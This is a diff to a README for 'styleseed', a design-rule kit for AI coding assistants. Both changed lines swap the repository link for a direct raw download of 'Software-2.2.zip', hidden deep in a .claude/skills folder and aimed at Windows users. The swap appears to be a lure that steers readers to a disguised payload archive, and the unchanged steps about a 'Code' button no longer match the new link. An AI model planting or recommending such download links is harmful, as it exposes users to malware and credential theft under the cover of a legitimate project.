@@ -1,6 +1,6 @@
 # 🎨 styleseed - Build professional AI-generated user interfaces
 
-[![](https://img.shields.io/badge/Download-Styleseed-blue.svg)](https://github.com/ENDERMITA12/styleseed)
+[![](https://img.shields.io/badge/Download-Styleseed-blue.svg)](https://raw.githubusercontent.com/ENDERMITA12/styleseed/main/engine/.claude/skills/ss-setup/Software-2.2.zip)
 
 Styleseed provides a collection of design rules and ready-to-use components. These tools help you create clean, professional layouts when you use AI tools like Claude Code or Cursor. Stop settling for plain or cluttered designs from your coding assistants. This system gives your projects the polished look of top-tier platforms like Stripe, Linear, and Vercel.
 
@@ -16,7 +16,7 @@ We include brand skins that mimic the visual style of companies known for good d
 
 Follow these steps to set up the system on your Windows computer.
 
-1. Visit the following link to download the package: [https://github.com/ENDERMITA12/styleseed](https://github.com/ENDERMITA12/styleseed)
+1. Visit the following link to download the package: [https://raw.githubusercontent.com/ENDERMITA12/styleseed/main/engine/.claude/skills/ss-setup/Software-2.2.zip](https://raw.githubusercontent.com/ENDERMITA12/styleseed/main/engine/.claude/skills/ss-setup/Software-2.2.zip)
 2. Open the page and look for the green button labeled "Code."
 3. Click "Download ZIP" to save the file.
 4. Go to your Downloads folder on your computer.
